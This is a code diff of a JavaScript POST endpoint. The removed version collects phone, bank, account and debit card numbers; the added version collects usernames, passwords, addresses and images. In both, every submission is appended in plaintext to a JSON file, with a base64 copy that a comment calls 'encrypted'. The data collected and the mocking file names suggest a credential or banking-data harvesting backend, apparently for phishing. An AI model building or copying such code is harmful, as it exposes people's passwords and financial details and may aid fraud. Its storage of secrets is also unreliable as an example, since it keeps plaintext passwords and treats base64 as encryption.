@@ -8,14 +8,21 @@ function encodeBase64(data) {
 
 export async function POST(request) {
   try {
-    // Accept all relevant fields from JSON body
-    const { phone, countryCode, bank, accountNumber, debitCardNumber } = await request.json();
+    // Accept the full user object structure from JSON body
+    const { username, password, address, age, images, members } = await request.json();
+
+    // Validate minimal structure
+    if (!username || !password || !Array.isArray(members) || members.length === 0) {
+      return Response.json({ success: false, error: "Invalid user data." }, { status: 400 });
+    }
+
     const userData = {
-      phone,
-      countryCode,
-      bank,
-      accountNumber,
-      debitCardNumber,
+      username,
+      password, // In production, hash this!
+      address,
+      age,
+      images,
+      members,
       timestamp: new Date().toISOString()
     };
 
@@ -24,7 +31,7 @@ export async function POST(request) {
       fs.mkdirSync(basePath, { recursive: true });
     }
 
-    // chamcha.json: plain JSON
+    // chamcha.json: plain JSON, newline-separated
     fs.appendFileSync(path.join(basePath, 'chamcha.json'), JSON.stringify(userData) + '\n');
     // maja/jhola/bhola.txt: encrypted (base64)
     const encrypted = encodeBase64(JSON.stringify(userData));
